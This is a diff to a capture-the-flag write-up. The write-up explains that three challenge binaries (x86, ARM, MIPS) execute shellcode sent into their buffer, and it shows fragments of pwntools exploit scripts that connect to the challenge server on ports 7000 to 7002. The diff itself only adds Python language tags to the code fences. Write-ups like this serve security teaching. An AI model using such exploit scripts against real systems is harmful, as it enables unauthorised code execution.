@@ -4,7 +4,7 @@
 In this task we were given three binaries, in x86, ARM and MIPS respectively. All of them jumped into our buffer so we can send the shellcode directly on all three binaries. Then each binary gives one third of the flag. 
 
 x86:
-```
+```Python
 p=remote("52.30.206.11",7000)
 p.recvuntil("> ")
 p.sendline("1")
@@ -16,7 +16,7 @@ p.interactive()
 ```
 
 ARM:
-```
+```Python
 from pwn import *
  
 p=remote("52.30.206.11",7001)
@@ -30,7 +30,7 @@ p.interactive()
 ```
 
 MIPS:
-```
+```Python
 from pwn import *
  
 p=remote("52.30.206.11",7002)
